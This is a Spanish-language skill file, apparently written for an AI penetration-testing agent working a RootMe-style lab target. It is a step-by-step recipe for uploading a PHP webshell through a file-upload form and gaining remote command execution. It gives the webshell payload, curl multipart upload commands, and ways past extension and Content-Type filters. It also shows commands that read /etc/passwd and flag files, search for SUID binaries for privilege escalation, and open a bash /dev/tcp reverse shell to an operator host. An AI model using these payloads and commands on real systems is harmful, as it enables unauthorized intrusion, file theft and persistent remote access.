---
name: web-upload-webshell
description: Sube una webshell a un formulario de subida evadiendo el filtro de extensión y consigue ejecución de comandos en el objetivo.
---

# Subir una webshell y conseguir RCE

Receta para cuando el objetivo expone un formulario de subida de archivos y la
fórmula obvia no funciona. Medida en RootMe (`/panel/`): 21 llamadas entre
`nexus.shell.exec` y `nexus.web.upload` sin subir nada, porque faltaba el campo
`submit=Upload` y el filtro rechazaba `.php`. `nexus.web.upload` sirve para
multipart simple, pero para un formulario con campos extra y redirects `curl`
desde `nexus.shell.exec` es más fácil de iterar: ves el HTML de respuesta tal
cual y cambias una sola cosa por intento.

## 1. Identifica el formulario

```bash
curl -sS http://<target>/panel/ | grep -i -E '<form|<input'
```

Busca `<input type="file" name="...">`: ese `name` es el nombre del campo de
fichero (`fileUpload`, `uploaded`, `file`, …). Anota también:

- el `action` del formulario (a dónde se hace POST) y su `method`;
- **todos** los `<input type="hidden">` y el botón de envío (`<input type="submit"
  name="submit" value="Upload">` → hay que enviar `submit=Upload`);
- si hay cookie de sesión, guárdala (`-c cookies.txt` / `-b cookies.txt`).

Si el formulario no se ve con `GET`, prueba la misma ruta con `-L`, revisa
`/robots.txt`, y enumera directorios (`nexus.recon.gobuster`) antes de asumir
que no existe.

## 2. Prepara la webshell en el workspace

`nexus.shell.exec` corre en la raíz del workspace del engagement, así que escribe
el fichero ahí y súbelo con ruta **relativa**:

```bash
printf '%s\n' '<?php system($_GET["c"]); ?>' > shell.phtml
ls -l shell.phtml
```

Si el payload tiene comillas o `$`, escríbelo con heredoc (`cat > shell.phtml
<<'PHP' … PHP`) para que bash no lo expanda. Comprueba con `cat` que el fichero
está completo antes de subirlo: un `curl` que sube 0 bytes devuelve 200 y parece
que funcionó.

## 3. Sube con curl

```bash
curl -sS -i \
  -F "fileUpload=@shell.phtml" \
  -F "submit=Upload" \
  http://<target>/panel/
```

Sustituye `fileUpload` por el `name` real del `<input type="file">`. Repite el
`-F` de cada campo oculto que viste en el HTML: un `submit=Upload` ausente es la
causa número uno de "no sube nada" (el servidor procesa el POST pero no el
fichero). Añade `-b cookies.txt` si el formulario requiere sesión y `-v` cuando
necesites ver el multipart exacto que se envía.

## 4. Evade el filtro de extensión

Si la respuesta dice "tipo no permitido", "extensión no válida" o simplemente no
aparece el mensaje de éxito, prueba en este orden (una extensión por intento, sin
cambiar nada más):

1. `.phtml` — la que suele funcionar cuando bloquean `.php`;
2. `.php5`;
3. `.php3`;
4. `.pHp` — los filtros que comparan cadenas en minúsculas la dejan pasar y
   Apache/PHP en Linux resuelve la extensión sin distinguir mayúsculas;
5. `.php.jpg` / `.phtml.png` solo si el filtro mira el sufijo final **y** el
   servidor tiene una regla de reescritura; si no, no se ejecuta.

Si el filtro valida el `Content-Type`, añade `-F
"fileUpload=@shell.phtml;type=image/png"` (el contenido sigue siendo PHP).

## 5. Comprueba si la subida funcionó

Tres señales, de más a menos fiable:

```bash
# a) mensaje de éxito o ruta en el HTML de respuesta
curl -sS -F "fileUpload=@shell.phtml" -F "submit=Upload" http://<target>/panel/ \
  | grep -i -E 'succes|uploaded|correctamente|/uploads/'

# b) listado del directorio de subidas
curl -sS http://<target>/uploads/
```

La tercera es disparar la webshell (paso 6): si responde, la subida funcionó.
Un `200` en el POST **no** prueba nada; el mensaje de éxito o el listado sí.

## 6. Dispara la webshell

```bash
curl -sS "http://<target>/uploads/shell.phtml?c=id"
curl -sS "http://<target>/uploads/shell.phtml?c=cat%20/etc/passwd"
```

Espera `uid=33(www-data)` o similar. **Loot primero**: con ese RCE ya puedes
leer `cat /home/*/user.txt` (y `find / -name user.txt`), así que hazlo antes de
cualquier otra cosa y regístralo como loot. Después escala: `find / -perm -4000`
y la skill `privesc-suid` si aparece `systemctl`. Solo si necesitas un TTY,
estabiliza con una reverse shell (`bash -c 'bash -i >& /dev/tcp/<lhost>/<lport>
0>&1'` con `nexus.post.listener` ya abierto). No compiles ni transfieras
binarios por el webshell: un comando por petición basta para SUID, sudo y `cat`.
Registra el acceso con la salida de `id` como evidencia.

## 7. Errores comunes

- **Falta `submit=Upload`** (o el `name` real del botón): el POST llega, el
  fichero no. Cópialo del HTML, no lo inventes.
- **El fichero no está donde crees**: `curl` corre en la raíz del workspace; si
  escribiste `shell.phtml` en un subdirectorio, usa `-F
  "fileUpload=@sub/shell.phtml"` o `cwd` explícito en `nexus.shell.exec`.
- **Nombre del campo de fichero equivocado**: `-F "file=@..."` cuando el input se
  llama `fileUpload` produce un 200 sin subida.
- **Sesión perdida**: el formulario exige cookie (`PHPSESSID`); sin `-b
  cookies.txt` la subida se rechaza en silencio.
- **Extensión bloqueada**: repite el paso 4 antes de cambiar de vector; no
  reintentes el mismo `.php` con otro nombre.
- **Ruta de subida distinta**: si `/uploads/` da 404, busca en el HTML el
  directorio real (`files/`, `images/`, `uploads/archivo_renombrado`) y prueba
  `shell.phtml` y `shell.phtml.txt` (algunos paneles renombran).
- **No re-subas lo mismo tres veces**: si dos intentos con extensiones distintas
  fallan igual, cambia de vector (LFI, `nexus.web.git_dump`, credenciales
  débiles) en lugar de repetir el formulario.
